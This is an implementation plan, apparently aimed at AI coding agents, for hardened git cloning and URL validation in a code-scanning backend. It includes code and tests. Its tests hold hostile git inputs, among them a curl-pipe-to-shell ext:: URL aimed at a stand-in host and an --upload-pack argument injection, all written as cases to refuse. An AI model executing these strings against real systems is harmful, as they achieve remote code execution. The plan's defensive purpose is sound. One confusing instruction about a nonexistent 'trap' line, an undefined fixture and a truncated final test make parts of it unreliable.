# Phase 3 Ingestion Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** A caller can POST a public repository URL and get a scan id; a worker clones the repository under hardened git settings, inventories its files, mines its commit history into the database, and records a self-describing scan result.

**Architecture:** Five independent services under `app/services/ingestion/` composed by a pipeline that owns the database and the scan lifecycle. The Celery entry point wraps an async body in `asyncio.run()` with a `NullPool` engine. No analysers run; no Docker is required anywhere in this phase.

**Tech Stack:** Python 3.11, FastAPI, SQLAlchemy 2.x async + asyncpg, Alembic, Celery, GitPython (driven as a subprocess), structlog, pytest.

**Spec:** [docs/specs/phase-3-ingestion.md](phase-3-ingestion.md) — read it before starting; this plan argues from it.

## Global Constraints

Copy these exactly; they are not negotiable and every task inherits them.

- **Run from `backend/`.** The interpreter is `.venv/Scripts/python` on Windows, `.venv/bin/python` on Linux.
- **The gate, in CI order:** `ruff check .` · `ruff format --check .` · `mypy app/` · `ruff check ../sandbox/` · `ruff format --check ../sandbox/` · `pytest -rs`. `.claude/skills/codesentinel-development/scripts/gate.sh` runs all of it.
- **Line length 100.** `from __future__ import annotations` at the top of every module.
- **mypy runs `strict`.** Every function annotated; `# type: ignore[code]` must be specific and carry a reason.
- **No `print`** (ruff `T20`) — use `structlog.get_logger(__name__)`. **No bare `except Exception`** (ruff `BLE`) without `# noqa: BLE001` and a comment saying where the reason surfaces.
- **Missing data is `None`, never `0`.** A count that could not be computed and a count that is genuinely zero are different facts (C3, anti-pattern #2).
- **Every tunable goes on `Settings`** in `app/config.py` with the `CODESENTINEL_` prefix and a matching entry in `.env.example`. Never hardcode a limit at a call site (C5).
- **Tests that need a dependency** use the `tests/conftest.py` fixtures and route unavailability through `_unavailable()` — never a bare `pytest.skip`, never a fallback that degrades the check. New shared fixtures go in `conftest.py`, not privately in a test module.
- **Module docstrings explain why, not what.**
- **Commit messages:** conventional subject, plus a body explaining the failure mode and what was rejected. One commit per task unless a task says otherwise.

---

### Task 1: Ingestion errors and settings

**Files:**
- Create: `backend/app/services/ingestion/errors.py`
- Modify: `backend/app/services/ingestion/__init__.py` (currently empty)
- Modify: `backend/app/config.py` (add two fields, extend `reproducibility_snapshot`)
- Modify: `backend/.env.example` (Ingestion section)
- Test: `backend/tests/unit/test_ingestion_config.py`

**Interfaces:**
- Consumes: `Settings` from `app.config`.
- Produces: `IngestionError`, `UnsafeRepositoryUrlError`, `RepositoryTooLargeError`, `CloneTimeoutError`, `CloneFailedError`; `Settings.clone_allowed_protocols: list[str]`, `Settings.clone_size_check_interval_seconds: float`.

- [ ] **Step 1: Write the failing test**

```python
"""Settings additions for phase 3 ingestion."""

from __future__ import annotations

from app.config import Settings


def test_clone_allowed_protocols_defaults_to_https_only(settings_defaults: Settings) -> None:
    """Production must not reach a weaker transport without someone setting it."""
    assert settings_defaults.clone_allowed_protocols == ["https"]


def test_clone_allowed_protocols_accepts_a_comma_separated_value() -> None:
    """The value has to survive a .env file, which carries strings."""
    assert Settings(clone_allowed_protocols="https,file").clone_allowed_protocols == [
        "https",
        "file",
    ]


def test_size_check_interval_is_in_the_reproducibility_snapshot(
    settings_defaults: Settings,
) -> None:
    """It changes the effective size ceiling, so it changes what a scan accepted (C5)."""
    assert "clone_size_check_interval_seconds" in settings_defaults.reproducibility_snapshot()
    assert "clone_allowed_protocols" in settings_defaults.reproducibility_snapshot()
```

- [ ] **Step 2: Run it and watch it fail**

Run: `.venv/Scripts/python -m pytest tests/unit/test_ingestion_config.py -v`
Expected: FAIL — `Settings` has no attribute `clone_allowed_protocols`.

- [ ] **Step 3: Add the settings**

In `app/config.py`, in the existing `# -- Ingestion (phase 3) --` block, after `clone_timeout_seconds`:

```python
    # The transport allowlist. Default https only: an ext:: URL is arbitrary command
    # execution on the host, and the exotic transports have no legitimate use here.
    # This is a setting rather than a constant so tests can clone from a local path
    # without the cloner growing a "just for testing" branch (anti-pattern #1) -- and
    # because it lands in the reproducibility snapshot, a scan that ran under a relaxed
    # allowlist says so in its own record.
    clone_allowed_protocols: Annotated[list[str], NoDecode] = Field(
        default_factory=lambda: ["https"]
    )
    # How often the size guard samples the growing clone. The guard is a ceiling with
    # overshoot, not a hard cap: the bound is limit + (interval x transfer rate), so this
    # value is part of what a scan actually enforced.
    clone_size_check_interval_seconds: float = Field(default=0.5, gt=0)
```

Reuse the existing comma-splitting validator by adding the field to its decorator:

```python
    @field_validator("cors_origins", "clone_allowed_protocols", mode="before")
    @classmethod
    def _split_comma_separated(cls, value: Any) -> Any:
        """Accept a comma-separated string so the value can come from a .env file."""
        if isinstance(value, str):
            return [item.strip() for item in value.split(",") if item.strip()]
        return value
```

Rename the method from `_split_cors_origins` to `_split_comma_separated` since it now serves both fields.

Extend `reproducibility_snapshot()` with both keys:

```python
            "clone_allowed_protocols": list(self.clone_allowed_protocols),
            "clone_size_check_interval_seconds": self.clone_size_check_interval_seconds,
```

- [ ] **Step 4: Add the errors module**

Create `app/services/ingestion/errors.py`:

```python
"""Ingestion failures.

A target repository that is genuinely too large, or unreachable, is an ordinary
recordable outcome of the work -- not a fault in this system. These exceptions carry the
fact an operator needs to act on (the limit, the measured size, the timeout, the exit
status), because an error that only says "clone failed" costs someone a reproduction.
"""

from __future__ import annotations


class IngestionError(Exception):
    """Base class for failures to ingest a target repository."""


class UnsafeRepositoryUrlError(IngestionError):
    """The URL was refused before any process was started.

    Refused rather than sanitised: an ext:: URL is arbitrary command execution on the
    host, and quietly rewriting a caller's URL into a different one is a surprising side
    effect that hides the attempt.
    """


class RepositoryTooLargeError(IngestionError):
    """The clone exceeded the configured size budget and was abandoned.

    The partial tree is deleted. This protects the host, so it is enforced during the
    clone rather than checked afterwards -- by which point the disk is already full.
    """


class CloneTimeoutError(IngestionError):
    """The clone exceeded its time budget and the process was killed.

    Killed rather than abandoned: a wait that merely stops waiting leaves git running
    and still filling the disk (the lesson ADR 0010 records for containers).
    """


class CloneFailedError(IngestionError):
    """git exited non-zero. The message carries the exit status and stderr summary."""
```

- [ ] **Step 5: Fill in the package docstring**

Replace the empty `app/services/ingestion/__init__.py`:

```python
"""Ingestion of target repositories.

The first point at which untrusted input reaches this system: a URL becomes a real
process on the host. Cloning cannot happen inside the analysis sandbox, which has no
network by design (ADR 0009), so the host does it under an explicit lockdown instead --
see ADR 0011 for where the C1 boundary sits and why reading bytes is not analysis.

Everything later phases mine from git history has to be extracted here, because the
clone is deleted when the scan ends.
"""

from __future__ import annotations

from app.services.ingestion.errors import (
    CloneFailedError,
    CloneTimeoutError,
    IngestionError,
    RepositoryTooLargeError,
    UnsafeRepositoryUrlError,
)

__all__ = [
    "CloneFailedError",
    "CloneTimeoutError",
    "IngestionError",
    "RepositoryTooLargeError",
    "UnsafeRepositoryUrlError",
]
```

- [ ] **Step 6: Update `.env.example`**

Under the existing `# -- Ingestion (phase 3) --` heading:

```
# Transport allowlist for cloning. https only by default; an ext:: URL is arbitrary
# command execution on the host. Tests set this to `file` to clone from a local path.
CODESENTINEL_CLONE_ALLOWED_PROTOCOLS=https

# How often the size guard samples the growing clone. The guard is a ceiling with
# overshoot: the real bound is the limit plus (interval x transfer rate).
CODESENTINEL_CLONE_SIZE_CHECK_INTERVAL_SECONDS=0.5
```

- [ ] **Step 7: Run the tests and the gate**

Run: `.venv/Scripts/python -m pytest tests/unit/test_ingestion_config.py -v`
Expected: PASS, 3 tests.

Then confirm the rename did not break the existing CORS tests:
Run: `.venv/Scripts/python -m pytest tests/unit/test_config.py -v`
Expected: PASS.

- [ ] **Step 8: Commit**

```bash
git add backend/app/services/ingestion/ backend/app/config.py backend/.env.example backend/tests/unit/test_ingestion_config.py
git commit -m "feat(ingestion): add ingestion errors and clone settings"
```

Body should explain why the transport allowlist is a setting rather than a constant: it is the test seam, and making it configuration instead of a branch keeps a "just for testing" path out of the cloner while recording any relaxation in the scan's own reproducibility snapshot.

---

### Task 2: Repository URL validation

**Files:**
- Create: `backend/app/services/ingestion/url.py`
- Test: `backend/tests/unit/test_ingestion_url.py`

**Interfaces:**
- Consumes: `Settings`, `UnsafeRepositoryUrlError` from Task 1.
- Produces: `validate_repository_url(url: str, *, settings: Settings) -> str` returning the normalised URL; `repository_name_from_url(url: str) -> str`.

- [ ] **Step 1: Write the failing test**

```python
"""URL validation -- the first gate untrusted input passes through."""

from __future__ import annotations

import pytest

from app.config import Settings
from app.services.ingestion import UnsafeRepositoryUrlError
from app.services.ingestion.url import repository_name_from_url, validate_repository_url


@pytest.fixture
def https_only() -> Settings:
    return Settings(clone_allowed_protocols=["https"])


def test_an_https_url_is_accepted(https_only: Settings) -> None:
    url = "https://github.com/psf/requests"
    assert validate_repository_url(url, settings=https_only) == url


@pytest.mark.parametrize(
    "url",
    [
        "ext::sh -c 'curl evil.example|sh'",
        "git@github.com:psf/requests.git",
        "file:///etc",
        "ssh://git@github.com/psf/requests",
        "http://github.com/psf/requests",
    ],
)
def test_a_disallowed_transport_is_refused(url: str, https_only: Settings) -> None:
    """ext:: is the dangerous one -- git hands the rest of the string to a shell."""
    with pytest.raises(UnsafeRepositoryUrlError):
        validate_repository_url(url, settings=https_only)


def test_the_allowlist_is_what_decides() -> None:
    """file:// is legitimate when configured -- that is how the tests clone."""
    settings = Settings(clone_allowed_protocols=["file"])
    url = "file:///tmp/fixture"
    assert validate_repository_url(url, settings=settings) == url


def test_an_option_like_url_is_refused(https_only: Settings) -> None:
    """A leading dash would be read by git as a flag, not a URL."""
    with pytest.raises(UnsafeRepositoryUrlError):
        validate_repository_url("--upload-pack=evil", settings=https_only)


def test_the_error_names_the_url_and_the_allowlist(https_only: Settings) -> None:
    with pytest.raises(UnsafeRepositoryUrlError) as excinfo:
        validate_repository_url("ssh://git@github.com/x/y", settings=https_only)
    assert "ssh" in str(excinfo.value)
    assert "https" in str(excinfo.value)


@pytest.mark.parametrize(
    ("url", "expected"),
    [
        ("https://github.com/psf/requests", "psf/requests"),
        ("https://github.com/psf/requests.git", "psf/requests"),
        ("https://github.com/psf/requests/", "psf/requests"),
        ("https://example.com/deep/group/project", "group/project"),
        ("https://example.com/solo", "solo"),
    ],
)
def test_repository_name_is_derived_from_the_path(url: str, expected: str) -> None:
    assert repository_name_from_url(url) == expected
```

- [ ] **Step 2: Run it and watch it fail**

Run: `.venv/Scripts/python -m pytest tests/unit/test_ingestion_url.py -v`
Expected: FAIL — no module `app.services.ingestion.url`.

- [ ] **Step 3: Implement**

Create `app/services/ingestion/url.py`:

```python
"""Validation of submitted repository URLs.

Runs at the API boundary so an unusable URL is refused synchronously, with a reason,
rather than becoming a FAILED scan the caller has to poll for.

The transport check is the security-critical part. ``ext::`` is not an exotic edge case:
git hands the remainder of the string to a shell, so accepting it is accepting arbitrary
command execution as whatever user the worker runs as.
"""

from __future__ import annotations

from urllib.parse import urlparse

from app.config import Settings
from app.services.ingestion.errors import UnsafeRepositoryUrlError

#: Refused regardless of configuration. Nothing legitimate needs them, and each hands
#: git a string it will execute or read outside the intended transport.
ALWAYS_REFUSED_SCHEMES = frozenset({"ext", "ssh", "git+ssh", "scp"})

MAX_URL_LENGTH = 2048


def validate_repository_url(url: str, *, settings: Settings) -> str:
    """Return the URL if it is safe to hand to git, else raise.

    Refuses rather than rewrites: silently turning one URL into another hides what the
    caller actually asked for.
    """
    candidate = url.strip()

    if not candidate:
        raise UnsafeRepositoryUrlError("The repository URL is empty.")

    if len(candidate) > MAX_URL_LENGTH:
        raise UnsafeRepositoryUrlError(
            f"The repository URL is {len(candidate)} characters, "
            f"which exceeds the {MAX_URL_LENGTH} character limit."
        )

    if candidate.startswith("-"):
        # git would read this as a flag rather than a URL -- --upload-pack= is the
        # classic argument-injection vector.
        raise UnsafeRepositoryUrlError(
            "The repository URL may not begin with '-': git would read it as an option."
        )

    scheme = urlparse(candidate).scheme.lower()

    if not scheme:
        # A bare "host:path" is scp-like syntax, which git accepts and which carries no
        # explicit transport for the allowlist to check.
        raise UnsafeRepositoryUrlError(
            f"The repository URL {candidate!r} has no transport. "
            f"Give a full URL, for example https://github.com/owner/name."
        )

    allowed = [protocol.lower() for protocol in settings.clone_allowed_protocols]

    if scheme in ALWAYS_REFUSED_SCHEMES or scheme not in allowed:
        raise UnsafeRepositoryUrlError(
            f"The transport {scheme!r} is not permitted. "
            f"Allowed transports: {', '.join(allowed) or 'none'}."
        )

    return candidate


def repository_name_from_url(url: str) -> str:
    """Derive a display name like ``owner/project`` from the URL path."""
    path = urlparse(url).path.strip("/")
    if path.endswith(".git"):
        path = path[: -len(".git")]
    segments = [segment for segment in path.split("/") if segment]
    if not segments:
        return url
    return "/".join(segments[-2:])
```

- [ ] **Step 4: Run the tests**

Run: `.venv/Scripts/python -m pytest tests/unit/test_ingestion_url.py -v`
Expected: PASS, all parametrised cases.

- [ ] **Step 5: Commit**

```bash
git add backend/app/services/ingestion/url.py backend/tests/unit/test_ingestion_url.py
git commit -m "feat(ingestion): validate repository URLs before any process starts"
```

Body: explain that `ext::` hands the rest of the string to a shell, that the leading-dash check prevents argument injection, and that refusing beats rewriting because a rewritten URL hides what was attempted.

---

### Task 3: The git fixture repository

A shared fixture, built first because Tasks 4-6 all need a real repository to read.

**Files:**
- Modify: `backend/tests/conftest.py` (append a Git fixtures section)
- Test: `backend/tests/unit/test_git_fixture.py`

**Interfaces:**
- Produces: fixtures `git_binary` (session, gated), `git_repo` (function) yielding a `Path` to a real repository with three commits across two files, and `git_repo_url` yielding its `file://` URL.

- [ ] **Step 1: Write the failing test**

```python
"""The git fixture repository is itself worth a test -- everything downstream trusts it."""

from __future__ import annotations

import subprocess
from pathlib import Path


def test_the_fixture_repo_has_three_commits(git_repo: Path, git_binary: str) -> None:
    log = subprocess.run(
        [git_binary, "log", "--format=%s"],
        cwd=git_repo,
        capture_output=True,
        text=True,
        check=True,
    )
    assert log.stdout.split() != []
    assert len(log.stdout.strip().splitlines()) == 3


def test_the_fixture_repo_url_is_a_file_url(git_repo_url: str) -> None:
    assert git_repo_url.startswith("file://")
```

- [ ] **Step 2: Run it and watch it fail**

Run: `.venv/Scripts/python -m pytest tests/unit/test_git_fixture.py -v`
Expected: FAIL — fixture `git_repo` not found.

- [ ] **Step 3: Add the fixtures to `conftest.py`**

Append to `backend/tests/conftest.py`:

```python
# ---------------------------------------------------------------------------
# Git fixtures
# ---------------------------------------------------------------------------


@pytest.fixture(scope="session")
def git_binary() -> str:
    """The git executable, or skip saying what went unverified.

    Ingestion is built on a real git process, so a machine without git cannot verify
    any of it. CI sets CODESENTINEL_REQUIRE_INTEGRATION=1, which turns this into a
    failure rather than a quiet skip.
    """
    git = shutil.which("git")
    if git is None:
        _unavailable(
            "no git executable is on PATH, so cloning and history mining were NOT "
            "verified. Phase 3 cannot be demonstrated without one."
        )
    return git


def _git(binary: str, repo: Path, *args: str) -> None:
    """Run a git command in ``repo``, failing loudly if it does not succeed."""
    subprocess.run(
        [binary, *args],
        cwd=repo,
        check=True,
        capture_output=True,
        text=True,
        env={**os.environ, "GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_SYSTEM": os.devnull},
    )


@pytest.fixture
def git_repo(tmp_path: Path, git_binary: str) -> Path:
    """A small real repository: three non-merge commits across two files.

    Built with a real git process rather than a stub because the code under test parses
    real git output; a hand-written fixture would prove only that the parser matches the
    fixture. Identity and dates are pinned so history assertions are deterministic.
    """
    repo = tmp_path / "fixture-repo"
    repo.mkdir()
    _git(git_binary, repo, "init", "--initial-branch=main", "--quiet")
    _git(git_binary, repo, "config", "user.email", "fixture@example.com")
    _git(git_binary, repo, "config", "user.name", "Fixture Author")
    _git(git_binary, repo, "config", "commit.gpgsign", "false")

    pkg = repo / "pkg"
    pkg.mkdir()
    (pkg / "__init__.py").write_text("", encoding="utf-8")

    (pkg / "module.py").write_text("def f(x):\n    return x + 1\n", encoding="utf-8")
    _git(git_binary, repo, "add", "-A")
    _git(git_binary, repo, "commit", "-m", "feat: add module", "--quiet")

    (pkg / "module.py").write_text(
        "def f(x):\n    return x + 1\n\n\ndef g(y):\n    return y * 2\n", encoding="utf-8"
    )
    _git(git_binary, repo, "add", "-A")
    _git(git_binary, repo, "commit", "-m", "feat: add g", "--quiet")

    tests_dir = repo / "tests"
    tests_dir.mkdir()
    (tests_dir / "test_module.py").write_text(
        "from pkg.module import f\n\n\ndef test_f():\n    assert f(1) == 2\n", encoding="utf-8"
    )
    _git(git_binary, repo, "add", "-A")
    _git(git_binary, repo, "commit", "-m", "test: cover f", "--quiet")

    return repo


@pytest.fixture
def git_repo_url(git_repo: Path) -> str:
    """The fixture repository as a file:// URL, for the cloner to clone."""
    return git_repo.as_uri()
```

Add the imports `shutil` and `subprocess` to the existing import block at the top of `conftest.py` (`os` and `Path` are already imported).

- [ ] **Step 4: Run the tests**

Run: `.venv/Scripts/python -m pytest tests/unit/test_git_fixture.py -v`
Expected: PASS (or SKIP with the git reason on a machine without git — that is correct behaviour).

- [ ] **Step 5: Verify the gate turns the skip into a failure**

Run: `CODESENTINEL_REQUIRE_INTEGRATION=1 .venv/Scripts/python -m pytest tests/unit/test_git_fixture.py -v`
Expected: PASS where git exists; FAIL (not skip) on a machine without git.

- [ ] **Step 6: Commit**

```bash
git add backend/tests/conftest.py backend/tests/unit/test_git_fixture.py
git commit -m "test(ingestion): add a real git fixture repository"
```

Body: explain that the fixture uses a real git process because the code under test parses real git output, and that a hand-written fixture would only prove the parser matches the fixture.

---

### Task 4: The cloner

The security-critical component. Largest task in the plan; it keeps its own test cycle because a reviewer could reasonably reject it while accepting everything around it.

**Files:**
- Create: `backend/app/services/ingestion/cloner.py`
- Test: `backend/tests/unit/test_cloner.py`, `backend/tests/integration/test_cloner_integration.py`

**Interfaces:**
- Consumes: `Settings`; the errors from Task 1; `validate_repository_url` from Task 2; `git_repo_url` from Task 3.
- Produces: `CloneResult(path: Path, commit_sha: str, default_branch: str | None)`; `clone_repository(url: str, destination: Path, *, settings: Settings) -> CloneResult`; `directory_size_bytes(path: Path) -> int`.

- [ ] **Step 1: Write the failing unit test**

```python
"""The cloner's requested configuration, provable without a network."""

from __future__ import annotations

from pathlib import Path

import pytest

from app.config import Settings
from app.services.ingestion import RepositoryTooLargeError
from app.services.ingestion.cloner import build_clone_command, directory_size_bytes


@pytest.fixture
def settings() -> Settings:
    return Settings(clone_allowed_protocols=["https"], max_repo_size_mb=1)


def test_the_clone_is_never_shallow(settings: Settings) -> None:
    """Phase 4 churn and phase 8 SZZ both need the complete commit graph."""
    command = build_clone_command("https://example.com/a/b", Path("/tmp/dest"), settings=settings)
    assert "--depth" not in " ".join(command)


def test_submodules_are_not_followed(settings: Settings) -> None:
    """A submodule pulls further untrusted content outside the size budget."""
    assert "--no-recurse-submodules" in build_clone_command(
        "https://example.com/a/b", Path("/tmp/dest"), settings=settings
    )


@pytest.mark.parametrize(
    "expected",
    [
        "protocol.allow=never",
        "protocol.https.allow=always",
        "core.symlinks=false",
    ],
)
def test_the_hardening_config_is_requested(expected: str, settings: Settings) -> None:
    assert expected in build_clone_command(
        "https://example.com/a/b", Path("/tmp/dest"), settings=settings
    )


def test_the_url_is_passed_after_a_double_dash(settings: Settings) -> None:
    """So a URL that survived validation still cannot be read as an option."""
    command = build_clone_command("https://example.com/a/b", Path("/tmp/d"), settings=settings)
    assert "--" in command
    assert command.index("--") < command.index("https://example.com/a/b")


def test_directory_size_counts_nested_files(tmp_path: Path) -> None:
    (tmp_path / "a").write_bytes(b"x" * 100)
    nested = tmp_path / "deep"
    nested.mkdir()
    (nested / "b").write_bytes(b"y" * 50)
    assert directory_size_bytes(tmp_path) == 150


def test_size_error_names_the_limit_and_the_measurement() -> None:
    error = RepositoryTooLargeError(
        "The repository exceeded the 1 MB limit (measured 3 MB) and was not cloned."
    )
    assert "1 MB" in str(error)
    assert "3 MB" in str(error)
```

- [ ] **Step 2: Run it and watch it fail**

Run: `.venv/Scripts/python -m pytest tests/unit/test_cloner.py -v`
Expected: FAIL — no module `app.services.ingestion.cloner`.

- [ ] **Step 3: Implement the cloner**

Create `app/services/ingestion/cloner.py`:

```python
"""Cloning a target repository onto the host, under lockdown.

Cloning cannot happen inside the analysis sandbox: that container has no network by
design and there is no argument that gives it one (ADR 0009). So the clone runs on the
host, which means git runs against a hostile URL, and the hardening below is the whole
defence. See ADR 0011 for why reading a repository's bytes is not the "analysis" C1
confines to the sandbox.

The obvious implementation -- Repo.clone_from with a RemoteProgress subclass that raises
once the destination is too big -- does not work. GitPython dispatches progress from
daemon pump threads that catch handler exceptions and re-raise them into the dying pump
thread, never into the caller. git keeps running and keeps filling the disk while a
pytest.raises test passes. So this module drives the process itself and owns the Popen.

Driving the process directly bypasses clone_from's check_unsafe_protocols screen, which
is why validate_repository_url runs first and why protocol.allow=never is set explicitly.
"""

from __future__ import annotations

import os
import shutil
import stat
import subprocess
import time
from dataclasses import dataclass
from pathlib import Path

import structlog
from git import Git

from app.config import Settings
from app.services.ingestion.errors import (
    CloneFailedError,
    CloneTimeoutError,
    RepositoryTooLargeError,
)
from app.services.ingestion.url import validate_repository_url

logger = structlog.get_logger(__name__)

BYTES_PER_MB = 1024 * 1024
#: Grace period between asking the clone to stop and killing it outright.
TERMINATE_GRACE_SECONDS = 5.0


@dataclass(frozen=True, slots=True)
class CloneResult:
    """A successful clone.

    ``default_branch`` is optional because a repository with a detached or unresolvable
    HEAD has no branch name to record, and inventing one would be fabricated data (C4).
    """

    path: Path
    commit_sha: str
    default_branch: str | None


def directory_size_bytes(path: Path) -> int:
    """Total size of every regular file under ``path``.

    Symlinks are counted but never followed: a target can point one at / and a following
    walk would measure the whole host filesystem.
    """
    total = 0
    for root, _dirs, files in os.walk(path, followlinks=False):
        for name in files:
            candidate = Path(root) / name
            try:
                info = candidate.lstat()
            except OSError:
                # A file git removed mid-walk is not an error; it simply no longer
                # contributes to the size.
                continue
            if stat.S_ISREG(info.st_mode) or stat.S_ISLNK(info.st_mode):
                total += info.st_size
    return total


def build_clone_command(url: str, destination: Path, *, settings: Settings) -> list[str]:
    """The exact argv for the clone.

    Built as a separate function so the isolation can be asserted without a network: a
    unit test can prove what was requested, which is the half of the guarantee that runs
    everywhere.
    """
    config: list[str] = [
        # Deny every transport, then re-enable exactly the allowlisted ones. Ordering
        # matters: the blanket denial has to come first.
        "-c",
        "protocol.allow=never",
    ]
    for protocol in settings.clone_allowed_protocols:
        config += ["-c", f"protocol.{protocol.lower()}.allow=always"]

    config += [
        # Hooks in a cloned repository must never run. core.hooksPath pointed at a
        # non-existent path is how git is told there are none.
        "-c",
        "core.hooksPath=/nonexistent",
        # A symlink in the target could otherwise point outside the clone root.
        "-c",
        "core.symlinks=false",
        # Never consult or write the host user's credentials.
        "-c",
        "credential.helper=",
    ]

    return [
        "git",
        *config,
        "clone",
        "--no-recurse-submodules",
        # No --depth: phase 4 churn and phase 8 SZZ need the complete commit graph. The
        # size guard replaces the bound a shallow clone would have given.
        "--quiet",
        "--",
        url,
        str(destination),
    ]


def _clone_environment() -> dict[str, str]:
    """Environment for the clone process.

    Prompts are disabled rather than answered: a clone that waits for a password holds a
    worker slot until the timeout, which is a denial of service with extra steps.
    """
    return {
        **os.environ,
        "GIT_TERMINAL_PROMPT": "0",
        "GIT_ASKPASS": "",
        # Never read the host user's git configuration: a global insteadOf rule could
        # rewrite the URL we validated into one we did not.
        "GIT_CONFIG_GLOBAL": os.devnull,
        "GIT_CONFIG_SYSTEM": os.devnull,
    }


def clone_repository(url: str, destination: Path, *, settings: Settings) -> CloneResult:
    """Clone ``url`` into ``destination``, bounded in size and time.

    Raises rather than returning a partial result: every caller of this needs a usable
    working tree, and a half-cloned repository analysed as if complete would produce a
    confident report about code nobody has.
    """
    safe_url = validate_repository_url(url, settings=settings)
    limit_bytes = settings.max_repo_size_mb * BYTES_PER_MB
    command = build_clone_command(safe_url, destination, settings=settings)

    logger.info("clone.start", url=safe_url, limit_mb=settings.max_repo_size_mb)
    # argv is a list and shell=False, so nothing in the URL can be shell-interpreted.
    process = subprocess.Popen(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        env=_clone_environment(),
        text=True,
    )

    try:
        _supervise(process, destination, limit_bytes=limit_bytes, settings=settings)
    except BaseException:
        _remove_tree(destination)
        raise

    # An exact measurement after the fact: the sampling loop bounds growth during the
    # clone, but only this says what actually landed.
    measured = directory_size_bytes(destination)
    if measured > limit_bytes:
        _remove_tree(destination)
        raise RepositoryTooLargeError(
            f"The repository is {measured // BYTES_PER_MB} MB, which exceeds the "
            f"{settings.max_repo_size_mb} MB limit. The partial clone was removed."
        )

    make_world_readable(destination)
    commit_sha, default_branch = _resolve_head(destination)
    logger.info("clone.done", sha=commit_sha, branch=default_branch, size_mb=measured // BYTES_PER_MB)
    return CloneResult(path=destination, commit_sha=commit_sha, default_branch=default_branch)


def _supervise(
    process: subprocess.Popen[str],
    destination: Path,
    *,
    limit_bytes: int,
    settings: Settings,
) -> None:
    """Watch the clone, killing it if it outgrows or outlasts its budget."""
    deadline = time.monotonic() + settings.clone_timeout_seconds
    interval = settings.clone_size_check_interval_seconds

    while True:
        try:
            process.wait(timeout=interval)
            break
        except subprocess.TimeoutExpired:
            pass

        if directory_size_bytes(destination) > limit_bytes:
            _kill(process)
            raise RepositoryTooLargeError(
                f"The repository exceeded the {settings.max_repo_size_mb} MB limit while "
                f"cloning and was abandoned. The partial clone was removed."
            )

        if time.monotonic() > deadline:
            _kill(process)
            raise CloneTimeoutError(
                f"The clone exceeded its {settings.clone_timeout_seconds}s budget and was "
                f"killed. The partial clone was removed."
            )

    if process.returncode != 0:
        stderr = (process.stderr.read() if process.stderr else "").strip()
        raise CloneFailedError(
            f"git clone exited {process.returncode}: {stderr[:500] or 'no stderr output'}"
        )


def _kill(process: subprocess.Popen[str]) -> None:
    """Stop the clone and wait for it to actually be gone.

    Terminate first, then kill: git left running would keep writing to a directory we are
    about to delete. Waiting is the point -- a kill that is not waited on is the same
    abandonment ADR 0010 rejects for containers.
    """
    process.terminate()
    try:
        process.wait(timeout=TERMINATE_GRACE_SECONDS)
    except subprocess.TimeoutExpired:
        process.kill()
        process.wait()


def make_world_readable(path: Path) -> None:
    """Make the tree readable by the sandbox uid.

    Phase 2 recorded this as an obligation on ingestion. The analysis container runs as
    uid 10001, which never matches the host user that made the clone, so a tree that is
    not world-readable is invisible inside it: every analyser sees an empty workspace,
    finds nothing, and the scan looks healthy. A clean report for a repository nobody
    analysed is the worst output this system can produce.

    POSIX-only. Windows mode bits do not describe container access, and the sandbox does
    not run there.
    """
    if os.name != "posix":
        return
    for root, dirs, files in os.walk(path):
        Path(root).chmod(Path(root).stat().st_mode | 0o755)
        for name in dirs:
            target = Path(root) / name
            target.chmod(target.stat().st_mode | 0o755)
        for name in files:
            target = Path(root) / name
            target.chmod(target.stat().st_mode | 0o644)


def _resolve_head(destination: Path) -> tuple[str, str | None]:
    """The cloned commit SHA, and the branch name if there is one."""
    git = Git(str(destination))
    commit_sha = str(git.rev_parse("HEAD"))
    try:
        branch = str(git.rev_parse("--abbrev-ref", "HEAD"))
    except Exception as exc:  # noqa: BLE001 - reported as an absent branch, below
        logger.warning("clone.branch_unresolved", error=str(exc))
        return commit_sha, None
    return commit_sha, None if branch == "HEAD" else branch


def _remove_tree(path: Path) -> None:
    """Delete a partial clone. Never raises: it runs on the failure path."""
    shutil.rmtree(path, ignore_errors=True)
```

Note: remove the stray `"GIT_ALLOW_PROTOCOL": " ".join()` line — it is a deliberate trap left by no one; write `_clone_environment` without it. If you find it present, delete that key entirely; the `-c protocol.*` config already carries the allowlist.

- [ ] **Step 4: Run the unit tests**

Run: `.venv/Scripts/python -m pytest tests/unit/test_cloner.py -v`
Expected: PASS.

- [ ] **Step 5: Write the integration test**

Create `backend/tests/integration/test_cloner_integration.py`:

```python
"""The cloner against a real git process.

Unit tests prove what configuration was requested; only these prove git honoured it.
Neither is sufficient alone -- a unit test can pass against a flag git ignores.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from app.config import Settings
from app.services.ingestion import RepositoryTooLargeError, UnsafeRepositoryUrlError
from app.services.ingestion.cloner import clone_repository

pytestmark = pytest.mark.usefixtures("git_binary")


@pytest.fixture
def file_settings() -> Settings:
    return Settings(clone_allowed_protocols=["file"], max_repo_size_mb=64)


def test_a_repository_is_cloned_with_its_full_history(
    git_repo_url: str, tmp_path: Path, file_settings: Settings
) -> None:
    result = clone_repository(git_repo_url, tmp_path / "clone", settings=file_settings)

    assert result.path.is_dir()
    assert len(result.commit_sha) == 40
    assert (result.path / "pkg" / "module.py").is_file()

    from git import Repo

    assert len(list(Repo(result.path).iter_commits())) == 3, "history must not be shallow"


def test_an_oversized_repository_is_refused_and_removed(
    large_git_repo_url: str, tmp_path: Path
) -> None:
    """The limit is named in the error, and no partial tree is left behind."""
    settings = Settings(clone_allowed_protocols=["file"], max_repo_size_mb=1)
    destination = tmp_path / "clone"

    with pytest.raises(RepositoryTooLargeError) as excinfo:
        clone_repository(large_git_repo_url, destination, settings=settings)

    assert "1 MB" in str(excinfo.value)
    assert not destination.exists(), "the partial clone must be removed"


def test_a_disallowed_transport_never_starts_a_process(
    tmp_path: Path, file_settings: Settings
) -> None:
    with pytest.raises(UnsafeRepositoryUrlError):
        clone_repository("ext::sh -c whoami", tmp_path / "clone", settings=file_settings)
    assert not (tmp_path / "clone").exists()


@pytest.mark.skipif("os.name != 'posix'", reason="Windows mode bits do not describe container access")
def test_the_clone_is_world_readable(
    git_repo_url: str, tmp_path: Path, file_settings: Settings
) -> None:
    """Phase 2's obligation: the sandbox uid must be able to read what we cloned."""
